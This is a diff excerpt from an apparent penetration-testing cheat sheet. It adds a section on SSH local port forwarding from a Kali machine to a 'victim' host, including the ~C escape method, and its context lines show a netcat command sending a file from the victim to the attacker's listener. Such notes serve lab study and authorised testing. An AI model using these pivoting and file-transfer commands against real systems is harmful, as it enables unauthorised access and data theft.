@@ -181,6 +181,28 @@ nc -lvp 4444 > file
 nc <kali_ip> 4444 < file
 
 
+================
+Port Forwarding:
+================
+
+#LINUX:
+
+SSH Local Port Forwarding:
+==========================
+
+On Kali:
+#Format: sudo ssh -N -L <KaliPort>:<VictimIP>:<VictimPort> kali@<KaliIP> -p 43022 
+
+sudo ssh -N -L 8081:192.168.139.125:43022 kali@192.168.49.139 [-p 43022]
+
+Alternate Way:
+If you're logged in via SSH in victim machine, press Enter and then press ~C. It will log in to ssh terminal and then run following command to forward port:
+
+ssh> -L <kaliPort>:VictimIP:<VictimPort>
+
+ssh> -L 8081:192.168.139.125:43022
+
+
 ========
 Cracking
 ========
